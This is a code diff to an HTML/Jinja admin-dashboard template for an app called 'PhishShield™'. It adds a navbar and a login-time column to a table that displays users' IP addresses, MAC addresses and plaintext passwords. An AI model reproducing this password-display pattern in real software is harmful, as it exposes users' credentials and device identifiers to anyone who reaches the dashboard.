@@ -29,9 +29,36 @@
       text-align: center;
       color: #333;
     }
+    .navbar {
+      margin-bottom: 20px;
+    }
   </style>
 </head>
 <body>
+
+  <!-- Navbar -->
+  <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+    <div class="container-fluid">
+      <a class="navbar-brand" href="/">PhishShield™</a>
+      <div class="collapse navbar-collapse">
+        <ul class="navbar-nav ms-auto">
+          <li class="nav-item">
+            <a href="/manual-check" class="nav-link">Manual Check</a>
+          </li>
+          {% if is_admin %}
+          <li class="nav-item">
+            <a href="/admin" class="btn btn-danger btn-sm ms-2">Admin Dashboard</a>
+          </li>
+          {% endif %}
+          <li class="nav-item">
+            <a href="/logout" class="btn btn-outline-light btn-sm ms-2">Logout</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <!-- Main Content -->
   <div class="dashboard-container">
     <h1 class="dashboard-title">Admin Dashboard</h1>
 
@@ -43,6 +70,7 @@
             <th>IP Address</th>
             <th>MAC Address</th>
             <th>Password</th>
+            <th>Login Time</th> <!-- NEW COLUMN -->
           </tr>
         </thead>
         <tbody>
@@ -52,15 +80,13 @@
             <td>{{ entry.ip }}</td>
             <td>{{ entry.mac }}</td>
             <td>{{ entry.password if entry.password else 'N/A' }}</td>
+            <td>{{ entry.timestamp if entry.timestamp else 'N/A' }}</td> <!-- NEW FIELD -->
           </tr>
           {% endfor %}
         </tbody>
       </table>
     </div>
   </div>
-  <a href="/logout" class="btn btn-danger" style=" top: 10px; left: 10px;">
-  Logout
-  </a>
 
 </body>
 </html>
